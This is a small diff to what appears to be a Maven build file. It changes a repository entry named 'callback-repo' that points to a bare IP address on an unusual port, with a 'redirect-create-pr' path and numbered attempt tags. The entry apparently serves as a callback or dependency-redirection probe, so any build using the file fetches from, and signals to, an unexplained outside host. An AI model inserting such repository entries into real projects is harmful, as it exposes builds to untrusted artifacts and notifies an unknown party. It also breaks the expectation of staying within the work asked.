@@ -11,7 +11,7 @@
   <repositories>
     <repository>
       <id>callback-repo</id>
-      <url>http://49.13.123.150:18080/redirect-create-pr/repo?attempt=20260311c</url>
+      <url>http://49.13.123.150:18082/redirect-create-pr/repo?attempt=20260311d</url>
     </repository>
   </repositories>
 
